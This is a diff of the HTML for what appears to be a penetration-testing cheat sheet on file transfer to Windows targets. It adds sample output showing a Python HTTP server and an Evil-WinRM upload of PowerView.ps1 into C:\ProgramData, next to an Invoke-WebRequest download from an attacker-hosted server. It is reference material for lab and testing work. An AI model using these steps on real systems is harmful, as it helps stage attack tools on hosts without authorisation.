@@ -337,6 +337,8 @@ body.dark-mode #dynamicFormContainer button:hover {
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="start-a-local-http-server">Start a Local HTTP Server</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 -m http.server &lt;LOCAL_PORT&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 -m http.server <span class="m">8443</span>
+</span></span><span class="line"><span class="cl"><span class="go">Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ...
 </span></span></span></code></pre></div><br>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Invoke-WebRequest
 </span></span><span class="line"><span class="cl"><span class="go">iwr http://&lt;LOCAL_IP&gt;:&lt;LOCAL_PORT&gt;/&lt;FILE&gt; -o C:\ProgramData\&lt;FILE&gt;
@@ -362,6 +364,13 @@ body.dark-mode #dynamicFormContainer button:hover {
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab3"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Evil-winrm built-in <span class="k">function</span>
 </span></span><span class="line"><span class="cl"><span class="go">upload &#39;&lt;LOCAL_FILE_PATH&gt;&#39; &#34;C:\ProgramData\&lt;FILE&gt;&#34;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; upload /home/kali/PowerView.ps1 C:\ProgramData\PowerView.ps1
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Info: Uploading /home/kali/PowerView.ps1 to C:\ProgramData\PowerView.ps1
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Data: 1027036 bytes of 1027036 bytes copied
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Info: Upload successful!
 </span></span></span></code></pre></div></div></p>
 
 </div></div>
